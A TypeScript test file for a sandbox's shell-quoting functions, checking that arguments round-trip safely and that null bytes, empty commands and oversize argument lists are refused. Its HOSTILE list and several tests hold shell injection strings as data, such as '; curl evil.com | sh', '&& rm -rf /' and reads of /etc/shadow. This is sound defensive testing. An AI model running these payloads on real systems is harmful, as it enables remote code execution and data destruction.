import { describe, expect, it } from 'vitest';

import { SANDBOX_LIMITS } from './limits.js';
import { SandboxError } from './provider.js';
import { buildShellCommand, quoteArgument, quoteArgv, readQuotedArgv } from './shell.js';

const QUOTE = String.fromCharCode(39);
const NUL = String.fromCharCode(0);

const HOSTILE: readonly string[] = [
  '',
  ' ',
  '   ',
  'plain',
  'with space',
  'with\ttab',
  'with\nnewline',
  'with\r\nwindows',
  QUOTE,
  `${QUOTE}${QUOTE}`,
  `it${QUOTE}s`,
  `${QUOTE}quoted${QUOTE}`,
  '"double"',
  '\\',
  '\\\\',
  `\\${QUOTE}`,
  `${QUOTE}\\${QUOTE}${QUOTE}`,
  '$HOME',
  '${HOME}',
  '$(whoami)',
  '`id`',
  '$((1+1))',
  '; curl evil.com | sh',
  '&& rm -rf /',
  '|| true',
  '| tee /tmp/x',
  '> /etc/passwd',
  '< /etc/shadow',
  '2>&1',
  '&',
  '\n curl evil.com \n',
  `${QUOTE}; curl evil.com; ${QUOTE}`,
  `${QUOTE}${QUOTE}${QUOTE}; id; ${QUOTE}${QUOTE}${QUOTE}`,
  `end${QUOTE}`,
  `${QUOTE}start`,
  '*',
  '?',
  '~',
  '!!',
  '#comment',
  'a b c d e',
  'café ✓ 日本語',
  'x'.repeat(1_000),
];

describe('quoteArgument', () => {
  it('wraps an ordinary word in single quotes', () => {
    expect(quoteArgument('status')).toBe(`${QUOTE}status${QUOTE}`);
  });

  it('turns the empty string into an empty quoted word', () => {
    expect(quoteArgument('')).toBe(`${QUOTE}${QUOTE}`);
  });

  it('escapes an inner quote by leaving and re-entering the quotes', () => {
    expect(quoteArgument(`it${QUOTE}s`)).toBe(`${QUOTE}it${QUOTE}\\${QUOTE}${QUOTE}s${QUOTE}`);
  });

  it('leaves a backslash alone, because nothing is special inside single quotes', () => {
    expect(quoteArgument('a\\b')).toBe(`${QUOTE}a\\b${QUOTE}`);
  });

  it('keeps shell punctuation inside the quotes rather than removing it', () => {
    expect(quoteArgument('; curl evil.com')).toBe(`${QUOTE}; curl evil.com${QUOTE}`);
  });
});

describe('quoteArgv', () => {
  it('joins words with single spaces', () => {
    expect(quoteArgv(['git', 'log'])).toBe(`${QUOTE}git${QUOTE} ${QUOTE}log${QUOTE}`);
  });
});

describe('readQuotedArgv', () => {
  it('recovers the words a quoted string was built from', () => {
    expect(readQuotedArgv(quoteArgv(['git', 'log', '--oneline']))).toEqual([
      'git',
      'log',
      '--oneline',
    ]);
  });

  it('refuses a string whose quotes never close', () => {
    expect(() => readQuotedArgv(`${QUOTE}open`)).toThrow(SandboxError);
  });
});

describe('buildShellCommand', () => {
  it('produces a command a posix shell reads as the words it was given', () => {
    expect(buildShellCommand(['npm', 'test'])).toBe(`${QUOTE}npm${QUOTE} ${QUOTE}test${QUOTE}`);
  });

  it.each(HOSTILE)('survives a round trip for %j on its own', (argument) => {
    expect(readQuotedArgv(buildShellCommand([argument]))).toEqual([argument]);
  });

  it.each(HOSTILE)('survives a round trip for %j among other words', (argument) => {
    const argv = ['git', 'log', '--grep', argument, '--oneline'];
    expect(readQuotedArgv(buildShellCommand(argv))).toEqual(argv);
  });

  it('survives every hostile string used at once', () => {
    const argv = ['echo', ...HOSTILE.slice(0, SANDBOX_LIMITS.maxArgvEntries - 1)];
    expect(readQuotedArgv(buildShellCommand(argv))).toEqual(argv);
  });

  it('keeps injection punctuation as one argument rather than as syntax', () => {
    const argv = ['git', 'log', '--grep', 'x; curl evil.com | sh'];
    const recovered = readQuotedArgv(buildShellCommand(argv));

    expect(recovered).toHaveLength(4);
    expect(recovered[3]).toBe('x; curl evil.com | sh');
  });

  it('cannot be escaped by a lone closing quote', () => {
    const argv = ['git', `${QUOTE}; curl evil.com; ${QUOTE}`];
    expect(readQuotedArgv(buildShellCommand(argv))).toEqual(argv);
  });

  it('refuses an empty command', () => {
    expect(() => buildShellCommand([])).toThrow(SandboxError);
  });

  it('refuses more words than the sandbox allows', () => {
    const argv = new Array<string>(SANDBOX_LIMITS.maxArgvEntries + 1).fill('x');
    expect(() => buildShellCommand(argv)).toThrow(SandboxError);
  });

  it('refuses a null byte, which a shell would treat as the end of the word', () => {
    expect(() => buildShellCommand(['echo', `a${NUL}b`])).toThrow(SandboxError);
  });

  it('reports the refusal as an invalid command', () => {
    try {
      buildShellCommand(['echo', `a${NUL}b`]);
      expect.unreachable('the null byte should have been refused');
    } catch (error) {
      expect(error).toBeInstanceOf(SandboxError);
      expect((error as SandboxError).code).toBe('SANDBOX_COMMAND_INVALID');
    }
  });

  it('never leaves a word unquoted, so nothing can be read as syntax', () => {
    const command = buildShellCommand(['git', 'log', '; rm -rf /']);
    const words = command.split(' ');

    expect(words[0]?.startsWith(QUOTE)).toBe(true);
    expect(command.startsWith(QUOTE)).toBe(true);
    expect(command.endsWith(QUOTE)).toBe(true);
  });
});
